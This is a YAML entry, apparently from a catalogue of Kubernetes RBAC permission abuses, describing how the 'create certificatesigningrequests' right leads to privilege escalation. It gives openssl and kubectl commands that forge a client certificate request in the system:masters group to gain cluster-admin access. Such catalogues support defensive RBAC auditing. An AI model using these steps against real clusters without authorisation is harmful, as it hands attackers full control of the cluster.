---
verb: "create"
resource: "certificatesigningrequests"
apiGroup: "certificates.k8s.io"
description: Request a certificate which needs to be approved to be issued"
abuses:
  - type: "Privilege Escalation"
    description: "1. Create a certificatesigningrequest with cluster admin privileges.
    2. The certificatesigningrequest needs to be approved ('update certificatesigningrequests/approval' permission is needed)
    (3. You may not be authorized to approve requests for that signer. In that case you need 'approve signers' in order to change that.)"
  - code: |
    # Generate private key
    openssl genrsa -out admin-client.key 2048

    # Create CSR with cluster admin privileges (system:masters)
    openssl req -new -key admin-client.key -out admin-client.csr -subj "/CN=admin-client/O=system:masters"

    # Base64 encode it
    cat admin-client.csr | base64 | tr -d "\n"

    # create Kubernetes-CSR Yaml admin-client-csr.yaml
    apiVersion: certificates.k8s.io/v1
    kind: CertificateSigningRequest
    metadata:
      name: admin-client
    spec:
      signerName: kubernetes.io/kube-apiserver-client
      request: <BASE64_CSR>
      usages:
        - client auth

    ## Apply it
    kubectl apply -f admin-client-csr.yaml

    ## Continue with 2.
---